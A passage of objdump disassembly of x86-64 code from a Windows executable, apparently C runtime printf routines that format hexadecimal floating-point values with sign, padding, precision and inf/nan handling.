   14000542b:	8b 40 10             	mov    0x10(%rax),%eax
   14000542e:	83 f8 0e             	cmp    $0xe,%eax
   140005431:	0f 8f 80 00 00 00    	jg     0x1400054b7
   140005437:	48 8b 03             	mov    (%rbx),%rax
   14000543a:	48 d1 e8             	shr    $1,%rax
   14000543d:	48 89 03             	mov    %rax,(%rbx)
   140005440:	48 8b 13             	mov    (%rbx),%rdx
   140005443:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140005447:	8b 40 10             	mov    0x10(%rax),%eax
   14000544a:	b9 0e 00 00 00       	mov    $0xe,%ecx
   14000544f:	29 c1                	sub    %eax,%ecx
   140005451:	8d 04 8d 00 00 00 00 	lea    0x0(,%rcx,4),%eax
   140005458:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   14000545e:	89 c1                	mov    %eax,%ecx
   140005460:	49 d3 e0             	shl    %cl,%r8
   140005463:	4c 89 c0             	mov    %r8,%rax
   140005466:	48 01 d0             	add    %rdx,%rax
   140005469:	48 89 03             	mov    %rax,(%rbx)
   14000546c:	48 8b 03             	mov    (%rbx),%rax
   14000546f:	48 85 c0             	test   %rax,%rax
   140005472:	78 0b                	js     0x14000547f
   140005474:	48 8b 03             	mov    (%rbx),%rax
   140005477:	48 01 c0             	add    %rax,%rax
   14000547a:	48 89 03             	mov    %rax,(%rbx)
   14000547d:	eb 15                	jmp    0x140005494
   14000547f:	0f b7 43 08          	movzwl 0x8(%rbx),%eax
   140005483:	83 c0 04             	add    $0x4,%eax
   140005486:	66 89 43 08          	mov    %ax,0x8(%rbx)
   14000548a:	48 8b 03             	mov    (%rbx),%rax
   14000548d:	48 c1 e8 03          	shr    $0x3,%rax
   140005491:	48 89 03             	mov    %rax,(%rbx)
   140005494:	48 8b 13             	mov    (%rbx),%rdx
   140005497:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000549b:	8b 40 10             	mov    0x10(%rax),%eax
   14000549e:	b9 0f 00 00 00       	mov    $0xf,%ecx
   1400054a3:	29 c1                	sub    %eax,%ecx
   1400054a5:	8d 04 8d 00 00 00 00 	lea    0x0(,%rcx,4),%eax
   1400054ac:	89 c1                	mov    %eax,%ecx
   1400054ae:	48 d3 ea             	shr    %cl,%rdx
   1400054b1:	48 89 d0             	mov    %rdx,%rax
   1400054b4:	48 89 03             	mov    %rax,(%rbx)
   1400054b7:	48 8b 03             	mov    (%rbx),%rax
   1400054ba:	48 85 c0             	test   %rax,%rax
   1400054bd:	75 0f                	jne    0x1400054ce
   1400054bf:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400054c3:	8b 40 10             	mov    0x10(%rax),%eax
   1400054c6:	85 c0                	test   %eax,%eax
   1400054c8:	0f 8e f8 00 00 00    	jle    0x1400055c6
   1400054ce:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400054d2:	8b 40 10             	mov    0x10(%rax),%eax
   1400054d5:	83 f8 0e             	cmp    $0xe,%eax
   1400054d8:	7f 1a                	jg     0x1400054f4
   1400054da:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400054de:	8b 40 10             	mov    0x10(%rax),%eax
   1400054e1:	85 c0                	test   %eax,%eax
   1400054e3:	78 0f                	js     0x1400054f4
   1400054e5:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400054e9:	8b 40 10             	mov    0x10(%rax),%eax
   1400054ec:	83 c0 01             	add    $0x1,%eax
   1400054ef:	89 45 f0             	mov    %eax,-0x10(%rbp)
   1400054f2:	eb 07                	jmp    0x1400054fb
   1400054f4:	c7 45 f0 10 00 00 00 	movl   $0x10,-0x10(%rbp)
   1400054fb:	e9 bc 00 00 00       	jmp    0x1400055bc
   140005500:	48 8b 03             	mov    (%rbx),%rax
   140005503:	83 e0 0f             	and    $0xf,%eax
   140005506:	89 45 e4             	mov    %eax,-0x1c(%rbp)
   140005509:	83 7d f0 01          	cmpl   $0x1,-0x10(%rbp)
   14000550d:	75 36                	jne    0x140005545
   14000550f:	48 8d 45 c0          	lea    -0x40(%rbp),%rax
   140005513:	48 3b 45 f8          	cmp    -0x8(%rbp),%rax
   140005517:	72 1b                	jb     0x140005534
   140005519:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000551d:	8b 40 08             	mov    0x8(%rax),%eax
   140005520:	25 00 08 00 00       	and    $0x800,%eax
   140005525:	85 c0                	test   %eax,%eax
   140005527:	75 0b                	jne    0x140005534
   140005529:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000552d:	8b 40 10             	mov    0x10(%rax),%eax
   140005530:	85 c0                	test   %eax,%eax
   140005532:	7e 2d                	jle    0x140005561
   140005534:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140005538:	48 8d 50 01          	lea    0x1(%rax),%rdx
   14000553c:	48 89 55 f8          	mov    %rdx,-0x8(%rbp)
   140005540:	c6 00 2e             	movb   $0x2e,(%rax)
   140005543:	eb 1c                	jmp    0x140005561
   140005545:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140005549:	8b 40 10             	mov    0x10(%rax),%eax
   14000554c:	85 c0                	test   %eax,%eax
   14000554e:	7e 11                	jle    0x140005561
   140005550:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140005554:	8b 40 10             	mov    0x10(%rax),%eax
   140005557:	8d 50 ff             	lea    -0x1(%rax),%edx
   14000555a:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000555e:	89 50 10             	mov    %edx,0x10(%rax)
   140005561:	83 7d e4 00          	cmpl   $0x0,-0x1c(%rbp)
   140005565:	75 15                	jne    0x14000557c
   140005567:	48 8d 45 c0          	lea    -0x40(%rbp),%rax
   14000556b:	48 3b 45 f8          	cmp    -0x8(%rbp),%rax
   14000556f:	72 0b                	jb     0x14000557c
   140005571:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140005575:	8b 40 10             	mov    0x10(%rax),%eax
   140005578:	85 c0                	test   %eax,%eax
   14000557a:	78 32                	js     0x1400055ae
   14000557c:	83 7d e4 09          	cmpl   $0x9,-0x1c(%rbp)
   140005580:	76 16                	jbe    0x140005598
   140005582:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   140005585:	8d 50 37             	lea    0x37(%rax),%edx
   140005588:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000558c:	8b 40 08             	mov    0x8(%rax),%eax
   14000558f:	83 e0 20             	and    $0x20,%eax
   140005592:	09 d0                	or     %edx,%eax
   140005594:	89 c1                	mov    %eax,%ecx
   140005596:	eb 08                	jmp    0x1400055a0
   140005598:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   14000559b:	83 c0 30             	add    $0x30,%eax
   14000559e:	89 c1                	mov    %eax,%ecx
   1400055a0:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400055a4:	48 8d 50 01          	lea    0x1(%rax),%rdx
   1400055a8:	48 89 55 f8          	mov    %rdx,-0x8(%rbp)
   1400055ac:	88 08                	mov    %cl,(%rax)
   1400055ae:	48 8b 03             	mov    (%rbx),%rax
   1400055b1:	48 c1 e8 04          	shr    $0x4,%rax
   1400055b5:	48 89 03             	mov    %rax,(%rbx)
   1400055b8:	83 6d f0 01          	subl   $0x1,-0x10(%rbp)
   1400055bc:	83 7d f0 00          	cmpl   $0x0,-0x10(%rbp)
   1400055c0:	0f 8f 3a ff ff ff    	jg     0x140005500
   1400055c6:	48 8d 45 c0          	lea    -0x40(%rbp),%rax
   1400055ca:	48 39 45 f8          	cmp    %rax,-0x8(%rbp)
   1400055ce:	75 39                	jne    0x140005609
   1400055d0:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400055d4:	8b 40 10             	mov    0x10(%rax),%eax
   1400055d7:	85 c0                	test   %eax,%eax
   1400055d9:	7f 10                	jg     0x1400055eb
   1400055db:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400055df:	8b 40 08             	mov    0x8(%rax),%eax
   1400055e2:	25 00 08 00 00       	and    $0x800,%eax
   1400055e7:	85 c0                	test   %eax,%eax
   1400055e9:	74 0f                	je     0x1400055fa
   1400055eb:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400055ef:	48 8d 50 01          	lea    0x1(%rax),%rdx
   1400055f3:	48 89 55 f8          	mov    %rdx,-0x8(%rbp)
   1400055f7:	c6 00 2e             	movb   $0x2e,(%rax)
   1400055fa:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400055fe:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140005602:	48 89 55 f8          	mov    %rdx,-0x8(%rbp)
   140005606:	c6 00 30             	movb   $0x30,(%rax)
   140005609:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000560d:	8b 40 0c             	mov    0xc(%rax),%eax
   140005610:	85 c0                	test   %eax,%eax
   140005612:	0f 8e e3 00 00 00    	jle    0x1400056fb
   140005618:	48 8d 45 c0          	lea    -0x40(%rbp),%rax
   14000561c:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
   140005620:	48 29 c2             	sub    %rax,%rdx
   140005623:	89 55 ec             	mov    %edx,-0x14(%rbp)
   140005626:	0f b7 43 08          	movzwl 0x8(%rbx),%eax
   14000562a:	98                   	cwtl
   14000562b:	89 45 e8             	mov    %eax,-0x18(%rbp)
   14000562e:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140005632:	8b 40 10             	mov    0x10(%rax),%eax
   140005635:	85 c0                	test   %eax,%eax
   140005637:	7e 0a                	jle    0x140005643
   140005639:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000563d:	8b 40 10             	mov    0x10(%rax),%eax
   140005640:	01 45 ec             	add    %eax,-0x14(%rbp)
   140005643:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140005647:	8b 40 08             	mov    0x8(%rax),%eax
   14000564a:	25 c0 01 00 00       	and    $0x1c0,%eax
   14000564f:	85 c0                	test   %eax,%eax
   140005651:	74 07                	je     0x14000565a
   140005653:	b8 06 00 00 00       	mov    $0x6,%eax
   140005658:	eb 05                	jmp    0x14000565f
   14000565a:	b8 05 00 00 00       	mov    $0x5,%eax
   14000565f:	01 45 ec             	add    %eax,-0x14(%rbp)
   140005662:	eb 0f                	jmp    0x140005673
   140005664:	83 45 ec 01          	addl   $0x1,-0x14(%rbp)
   140005668:	0f b7 45 f6          	movzwl -0xa(%rbp),%eax
   14000566c:	83 c0 01             	add    $0x1,%eax
   14000566f:	66 89 45 f6          	mov    %ax,-0xa(%rbp)
   140005673:	8b 45 e8             	mov    -0x18(%rbp),%eax
   140005676:	48 63 d0             	movslq %eax,%rdx
   140005679:	48 69 d2 67 66 66 66 	imul   $0x66666667,%rdx,%rdx
   140005680:	48 c1 ea 20          	shr    $0x20,%rdx
   140005684:	89 d1                	mov    %edx,%ecx
   140005686:	c1 f9 02             	sar    $0x2,%ecx
   140005689:	99                   	cltd
   14000568a:	89 c8                	mov    %ecx,%eax
   14000568c:	29 d0                	sub    %edx,%eax
   14000568e:	89 45 e8             	mov    %eax,-0x18(%rbp)
   140005691:	83 7d e8 00          	cmpl   $0x0,-0x18(%rbp)
   140005695:	75 cd                	jne    0x140005664
   140005697:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000569b:	8b 40 0c             	mov    0xc(%rax),%eax
   14000569e:	39 45 ec             	cmp    %eax,-0x14(%rbp)
   1400056a1:	7d 4d                	jge    0x1400056f0
   1400056a3:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400056a7:	8b 40 0c             	mov    0xc(%rax),%eax
   1400056aa:	2b 45 ec             	sub    -0x14(%rbp),%eax
   1400056ad:	89 c2                	mov    %eax,%edx
   1400056af:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400056b3:	89 50 0c             	mov    %edx,0xc(%rax)
   1400056b6:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400056ba:	8b 40 08             	mov    0x8(%rax),%eax
   1400056bd:	25 00 06 00 00       	and    $0x600,%eax
   1400056c2:	85 c0                	test   %eax,%eax
   1400056c4:	75 35                	jne    0x1400056fb
   1400056c6:	eb 11                	jmp    0x1400056d9
   1400056c8:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400056cc:	48 89 c2             	mov    %rax,%rdx
   1400056cf:	b9 20 00 00 00       	mov    $0x20,%ecx
   1400056d4:	e8 b7 e4 ff ff       	call   0x140003b90
   1400056d9:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400056dd:	8b 40 0c             	mov    0xc(%rax),%eax
   1400056e0:	8d 48 ff             	lea    -0x1(%rax),%ecx
   1400056e3:	48 8b 55 28          	mov    0x28(%rbp),%rdx
   1400056e7:	89 4a 0c             	mov    %ecx,0xc(%rdx)
   1400056ea:	85 c0                	test   %eax,%eax
   1400056ec:	7f da                	jg     0x1400056c8
   1400056ee:	eb 0b                	jmp    0x1400056fb
   1400056f0:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400056f4:	c7 40 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rax)
   1400056fb:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400056ff:	8b 40 08             	mov    0x8(%rax),%eax
   140005702:	25 80 00 00 00       	and    $0x80,%eax
   140005707:	85 c0                	test   %eax,%eax
   140005709:	74 13                	je     0x14000571e
   14000570b:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000570f:	48 89 c2             	mov    %rax,%rdx
   140005712:	b9 2d 00 00 00       	mov    $0x2d,%ecx
   140005717:	e8 74 e4 ff ff       	call   0x140003b90
   14000571c:	eb 42                	jmp    0x140005760
   14000571e:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140005722:	8b 40 08             	mov    0x8(%rax),%eax
   140005725:	25 00 01 00 00       	and    $0x100,%eax
   14000572a:	85 c0                	test   %eax,%eax
   14000572c:	74 13                	je     0x140005741
   14000572e:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140005732:	48 89 c2             	mov    %rax,%rdx
   140005735:	b9 2b 00 00 00       	mov    $0x2b,%ecx
   14000573a:	e8 51 e4 ff ff       	call   0x140003b90
   14000573f:	eb 1f                	jmp    0x140005760
   140005741:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140005745:	8b 40 08             	mov    0x8(%rax),%eax
   140005748:	83 e0 40             	and    $0x40,%eax
   14000574b:	85 c0                	test   %eax,%eax
   14000574d:	74 11                	je     0x140005760
   14000574f:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140005753:	48 89 c2             	mov    %rax,%rdx
   140005756:	b9 20 00 00 00       	mov    $0x20,%ecx
   14000575b:	e8 30 e4 ff ff       	call   0x140003b90
   140005760:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140005764:	48 89 c2             	mov    %rax,%rdx
   140005767:	b9 30 00 00 00       	mov    $0x30,%ecx
   14000576c:	e8 1f e4 ff ff       	call   0x140003b90
   140005771:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140005775:	8b 40 08             	mov    0x8(%rax),%eax
   140005778:	83 e0 20             	and    $0x20,%eax
   14000577b:	83 c8 58             	or     $0x58,%eax
   14000577e:	89 c1                	mov    %eax,%ecx
   140005780:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140005784:	48 89 c2             	mov    %rax,%rdx
   140005787:	e8 04 e4 ff ff       	call   0x140003b90
   14000578c:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140005790:	8b 40 0c             	mov    0xc(%rax),%eax
   140005793:	85 c0                	test   %eax,%eax
   140005795:	7e 54                	jle    0x1400057eb
   140005797:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000579b:	8b 40 08             	mov    0x8(%rax),%eax
   14000579e:	25 00 02 00 00       	and    $0x200,%eax
   1400057a3:	85 c0                	test   %eax,%eax
   1400057a5:	74 44                	je     0x1400057eb
   1400057a7:	eb 11                	jmp    0x1400057ba
   1400057a9:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400057ad:	48 89 c2             	mov    %rax,%rdx
   1400057b0:	b9 30 00 00 00       	mov    $0x30,%ecx
   1400057b5:	e8 d6 e3 ff ff       	call   0x140003b90
   1400057ba:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400057be:	8b 40 0c             	mov    0xc(%rax),%eax
   1400057c1:	8d 48 ff             	lea    -0x1(%rax),%ecx
   1400057c4:	48 8b 55 28          	mov    0x28(%rbp),%rdx
   1400057c8:	89 4a 0c             	mov    %ecx,0xc(%rdx)
   1400057cb:	85 c0                	test   %eax,%eax
   1400057cd:	7f da                	jg     0x1400057a9
   1400057cf:	eb 1a                	jmp    0x1400057eb
   1400057d1:	48 83 6d f8 01       	subq   $0x1,-0x8(%rbp)
   1400057d6:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400057da:	0f b6 00             	movzbl (%rax),%eax
   1400057dd:	0f be c0             	movsbl %al,%eax
   1400057e0:	48 8b 55 28          	mov    0x28(%rbp),%rdx
   1400057e4:	89 c1                	mov    %eax,%ecx
   1400057e6:	e8 33 f2 ff ff       	call   0x140004a1e
   1400057eb:	48 8d 45 c0          	lea    -0x40(%rbp),%rax
   1400057ef:	48 3b 45 f8          	cmp    -0x8(%rbp),%rax
   1400057f3:	72 dc                	jb     0x1400057d1
   1400057f5:	eb 11                	jmp    0x140005808
   1400057f7:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400057fb:	48 89 c2             	mov    %rax,%rdx
   1400057fe:	b9 30 00 00 00       	mov    $0x30,%ecx
   140005803:	e8 88 e3 ff ff       	call   0x140003b90
   140005808:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000580c:	8b 40 10             	mov    0x10(%rax),%eax
   14000580f:	8d 48 ff             	lea    -0x1(%rax),%ecx
   140005812:	48 8b 55 28          	mov    0x28(%rbp),%rdx
   140005816:	89 4a 10             	mov    %ecx,0x10(%rdx)
   140005819:	85 c0                	test   %eax,%eax
   14000581b:	7f da                	jg     0x1400057f7
   14000581d:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140005821:	8b 40 08             	mov    0x8(%rax),%eax
   140005824:	83 e0 20             	and    $0x20,%eax
   140005827:	83 c8 50             	or     $0x50,%eax
   14000582a:	89 c1                	mov    %eax,%ecx
   14000582c:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140005830:	48 89 c2             	mov    %rax,%rdx
   140005833:	e8 58 e3 ff ff       	call   0x140003b90
   140005838:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000583c:	8b 50 0c             	mov    0xc(%rax),%edx
   14000583f:	0f bf 45 f6          	movswl -0xa(%rbp),%eax
   140005843:	01 c2                	add    %eax,%edx
   140005845:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140005849:	89 50 0c             	mov    %edx,0xc(%rax)
   14000584c:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140005850:	8b 40 08             	mov    0x8(%rax),%eax
   140005853:	0d c0 01 00 00       	or     $0x1c0,%eax
   140005858:	89 c2                	mov    %eax,%edx
   14000585a:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000585e:	89 50 08             	mov    %edx,0x8(%rax)
   140005861:	0f b7 43 08          	movzwl 0x8(%rbx),%eax
   140005865:	66 85 c0             	test   %ax,%ax
   140005868:	79 09                	jns    0x140005873
   14000586a:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   140005871:	eb 05                	jmp    0x140005878
   140005873:	b8 00 00 00 00       	mov    $0x0,%eax
   140005878:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
   14000587c:	0f b7 43 08          	movzwl 0x8(%rbx),%eax
   140005880:	48 0f bf c0          	movswq %ax,%rax
   140005884:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
   140005888:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
   14000588c:	48 8b 55 b8          	mov    -0x48(%rbp),%rdx
   140005890:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
   140005894:	48 89 55 a8          	mov    %rdx,-0x58(%rbp)
   140005898:	48 8b 55 28          	mov    0x28(%rbp),%rdx
   14000589c:	48 8d 45 a0          	lea    -0x60(%rbp),%rax
   1400058a0:	48 89 c1             	mov    %rax,%rcx
   1400058a3:	e8 66 e7 ff ff       	call   0x14000400e
   1400058a8:	90                   	nop
   1400058a9:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   1400058b0:	5b                   	pop    %rbx
   1400058b1:	5d                   	pop    %rbp
   1400058b2:	c3                   	ret
   1400058b3:	55                   	push   %rbp
   1400058b4:	53                   	push   %rbx
   1400058b5:	48 83 ec 78          	sub    $0x78,%rsp
   1400058b9:	48 8d 6c 24 70       	lea    0x70(%rsp),%rbp
   1400058be:	48 89 cb             	mov    %rcx,%rbx
   1400058c1:	db 2b                	fldt   (%rbx)
   1400058c3:	db 7d d0             	fstpt  -0x30(%rbp)
   1400058c6:	48 89 55 28          	mov    %rdx,0x28(%rbp)
   1400058ca:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
   1400058d1:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
   1400058d5:	db 6d d0             	fldt   -0x30(%rbp)
   1400058d8:	db 7d c0             	fstpt  -0x40(%rbp)
   1400058db:	48 8d 55 c0          	lea    -0x40(%rbp),%rdx
   1400058df:	48 89 c1             	mov    %rax,%rcx
   1400058e2:	e8 c8 ed ff ff       	call   0x1400046af
   1400058e7:	db 6d d0             	fldt   -0x30(%rbp)
   1400058ea:	db 7d c0             	fstpt  -0x40(%rbp)
   1400058ed:	48 8d 45 c0          	lea    -0x40(%rbp),%rax
   1400058f1:	48 89 c1             	mov    %rax,%rcx
   1400058f4:	e8 b7 3d 00 00       	call   0x1400096b0
   1400058f9:	85 c0                	test   %eax,%eax
   1400058fb:	74 1d                	je     0x14000591a
   1400058fd:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140005900:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
   140005904:	48 8d 15 db 6b 00 00 	lea    0x6bdb(%rip),%rdx        # 0x14000c4e6
   14000590b:	49 89 c8             	mov    %rcx,%r8
   14000590e:	89 c1                	mov    %eax,%ecx
   140005910:	e8 76 f1 ff ff       	call   0x140004a8b
   140005915:	e9 aa 00 00 00       	jmp    0x1400059c4
   14000591a:	0f b7 45 e8          	movzwl -0x18(%rbp),%eax
   14000591e:	98                   	cwtl
   14000591f:	25 00 80 00 00       	and    $0x8000,%eax
   140005924:	89 45 fc             	mov    %eax,-0x4(%rbp)
   140005927:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   14000592b:	74 12                	je     0x14000593f
   14000592d:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140005931:	8b 40 08             	mov    0x8(%rax),%eax
   140005934:	0c 80                	or     $0x80,%al
   140005936:	89 c2                	mov    %eax,%edx
   140005938:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000593c:	89 50 08             	mov    %edx,0x8(%rax)
   14000593f:	db 6d d0             	fldt   -0x30(%rbp)
   140005942:	db 7d c0             	fstpt  -0x40(%rbp)
   140005945:	48 8d 45 c0          	lea    -0x40(%rbp),%rax
   140005949:	48 89 c1             	mov    %rax,%rcx
   14000594c:	e8 6f 3c 00 00       	call   0x1400095c0
   140005951:	3d 00 05 00 00       	cmp    $0x500,%eax
   140005956:	75 1a                	jne    0x140005972
   140005958:	8b 45 fc             	mov    -0x4(%rbp),%eax
   14000595b:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
   14000595f:	48 8d 15 84 6b 00 00 	lea    0x6b84(%rip),%rdx        # 0x14000c4ea
   140005966:	49 89 c8             	mov    %rcx,%r8
   140005969:	89 c1                	mov    %eax,%ecx
   14000596b:	e8 1b f1 ff ff       	call   0x140004a8b
   140005970:	eb 52                	jmp    0x1400059c4
   140005972:	0f b7 45 e8          	movzwl -0x18(%rbp),%eax
   140005976:	66 25 ff 7f          	and    $0x7fff,%ax
   14000597a:	66 89 45 e8          	mov    %ax,-0x18(%rbp)
   14000597e:	0f b7 45 e8          	movzwl -0x18(%rbp),%eax
   140005982:	66 85 c0             	test   %ax,%ax
   140005985:	75 11                	jne    0x140005998
   140005987:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   14000598b:	48 85 c0             	test   %rax,%rax
   14000598e:	74 14                	je     0x1400059a4
   140005990:	66 c7 45 e8 02 c0    	movw   $0xc002,-0x18(%rbp)
   140005996:	eb 0c                	jmp    0x1400059a4
   140005998:	0f b7 45 e8          	movzwl -0x18(%rbp),%eax
   14000599c:	66 2d ff 3f          	sub    $0x3fff,%ax
   1400059a0:	66 89 45 e8          	mov    %ax,-0x18(%rbp)
   1400059a4:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   1400059a8:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
   1400059ac:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
   1400059b0:	48 89 55 b8          	mov    %rdx,-0x48(%rbp)
   1400059b4:	48 8b 55 28          	mov    0x28(%rbp),%rdx
   1400059b8:	48 8d 45 b0          	lea    -0x50(%rbp),%rax
   1400059bc:	48 89 c1             	mov    %rax,%rcx
   1400059bf:	e8 12 fa ff ff       	call   0x1400053d6
   1400059c4:	90                   	nop
   1400059c5:	48 83 c4 78          	add    $0x78,%rsp
   1400059c9:	5b                   	pop    %rbx
   1400059ca:	5d                   	pop    %rbp
   1400059cb:	c3                   	ret
   1400059cc:	55                   	push   %rbp
   1400059cd:	48 89 e5             	mov    %rsp,%rbp
   1400059d0:	48 83 ec 60          	sub    $0x60,%rsp
   1400059d4:	f2 0f 11 45 10       	movsd  %xmm0,0x10(%rbp)
   1400059d9:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   1400059dd:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
   1400059e4:	dd 45 10             	fldl   0x10(%rbp)
   1400059e7:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
   1400059eb:	db 7d d0             	fstpt  -0x30(%rbp)
   1400059ee:	48 8d 55 d0          	lea    -0x30(%rbp),%rdx
   1400059f2:	48 89 c1             	mov    %rax,%rcx
   1400059f5:	e8 b5 ec ff ff       	call   0x1400046af
   1400059fa:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400059fe:	66 48 0f 6e c0       	movq   %rax,%xmm0
   140005a03:	e8 48 3c 00 00       	call   0x140009650
   140005a08:	85 c0                	test   %eax,%eax
   140005a0a:	74 1d                	je     0x140005a29
   140005a0c:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140005a0f:	48 8b 4d 18          	mov    0x18(%rbp),%rcx
   140005a13:	48 8d 15 cc 6a 00 00 	lea    0x6acc(%rip),%rdx        # 0x14000c4e6
   140005a1a:	49 89 c8             	mov    %rcx,%r8
   140005a1d:	89 c1                	mov    %eax,%ecx
   140005a1f:	e8 67 f0 ff ff       	call   0x140004a8b
   140005a24:	e9 f9 00 00 00       	jmp    0x140005b22
   140005a29:	0f b7 45 e8          	movzwl -0x18(%rbp),%eax
   140005a2d:	98                   	cwtl
   140005a2e:	25 00 80 00 00       	and    $0x8000,%eax
   140005a33:	89 45 fc             	mov    %eax,-0x4(%rbp)
   140005a36:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   140005a3a:	74 12                	je     0x140005a4e
   140005a3c:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140005a40:	8b 40 08             	mov    0x8(%rax),%eax
   140005a43:	0c 80                	or     $0x80,%al
   140005a45:	89 c2                	mov    %eax,%edx
   140005a47:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140005a4b:	89 50 08             	mov    %edx,0x8(%rax)
   140005a4e:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140005a52:	66 48 0f 6e c0       	movq   %rax,%xmm0
   140005a57:	e8 e4 3a 00 00       	call   0x140009540
   140005a5c:	3d 00 05 00 00       	cmp    $0x500,%eax
   140005a61:	75 1d                	jne    0x140005a80
   140005a63:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140005a66:	48 8b 4d 18          	mov    0x18(%rbp),%rcx
   140005a6a:	48 8d 15 79 6a 00 00 	lea    0x6a79(%rip),%rdx        # 0x14000c4ea
   140005a71:	49 89 c8             	mov    %rcx,%r8
   140005a74:	89 c1                	mov    %eax,%ecx
   140005a76:	e8 10 f0 ff ff       	call   0x140004a8b
   140005a7b:	e9 a2 00 00 00       	jmp    0x140005b22
   140005a80:	0f b7 45 e8          	movzwl -0x18(%rbp),%eax
   140005a84:	66 25 ff 7f          	and    $0x7fff,%ax
   140005a88:	66 89 45 e8          	mov    %ax,-0x18(%rbp)
   140005a8c:	0f b7 45 e8          	movzwl -0x18(%rbp),%eax
   140005a90:	66 85 c0             	test   %ax,%ax
   140005a93:	74 3b                	je     0x140005ad0
   140005a95:	0f b7 45 e8          	movzwl -0x18(%rbp),%eax
   140005a99:	66 3d 00 3c          	cmp    $0x3c00,%ax
   140005a9d:	7f 31                	jg     0x140005ad0
   140005a9f:	0f b7 45 e8          	movzwl -0x18(%rbp),%eax
   140005aa3:	98                   	cwtl
   140005aa4:	ba 01 3c 00 00       	mov    $0x3c01,%edx
   140005aa9:	29 c2                	sub    %eax,%edx
   140005aab:	89 55 f8             	mov    %edx,-0x8(%rbp)
   140005aae:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
   140005ab2:	8b 45 f8             	mov    -0x8(%rbp),%eax
   140005ab5:	89 c1                	mov    %eax,%ecx
   140005ab7:	48 d3 ea             	shr    %cl,%rdx
   140005aba:	48 89 d0             	mov    %rdx,%rax
   140005abd:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   140005ac1:	0f b7 45 e8          	movzwl -0x18(%rbp),%eax
   140005ac5:	89 c2                	mov    %eax,%edx
   140005ac7:	8b 45 f8             	mov    -0x8(%rbp),%eax
   140005aca:	01 d0                	add    %edx,%eax
